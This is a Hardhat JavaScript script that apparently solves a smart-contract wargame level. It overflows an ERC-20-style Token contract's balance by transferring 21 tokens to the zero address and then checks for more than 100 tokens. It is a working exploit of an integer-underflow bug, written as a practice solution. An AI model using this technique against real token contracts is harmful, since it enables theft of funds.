const { Wallet } = require("ethers")
const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")
require("dotenv").config()

async function main() {
    await resetNode()
    let bal, tx, res
    let attacker = new Wallet(process.env.METAMASK_PRIVATE_KEY, ethers.provider)
    let instanceAddress = "0x8dD7824d9cdfE323a1d94C2BFf21fEBE2a928D3c"
    let target = await ethers.getContractAt("Token", instanceAddress, attacker)

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Found target contract at address: ${target.address}`)

    // Attack
    tx = await target.transfer(ethers.constants.AddressZero, 21)
    await tx.wait(1)

    // Check
    bal = (await target.balanceOf(attacker.address)).toString()
    if (bal > 100) {
        console.log(`${symbols.success} Got a bunch of Tokens! (${bal})`)
    } else {
        console.log(`${symbols.error} Only have ${bal} tokens!`)
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
